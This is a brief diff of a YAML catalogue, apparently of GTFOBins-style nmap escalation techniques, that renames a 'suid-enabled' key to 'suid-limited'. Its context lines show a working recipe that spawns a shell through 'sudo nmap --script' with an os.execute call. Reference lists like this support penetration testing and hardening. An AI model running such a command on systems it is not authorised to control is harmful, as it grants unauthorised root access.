@@ -82,7 +82,7 @@ functions:
         TF=$(mktemp)
         echo 'os.execute("/bin/sh")' > $TF
         sudo nmap --script=$TF
-  suid-enabled:
+  suid-limited:
     - description: Input echo is disabled.
       code: |
         TF=$(mktemp)
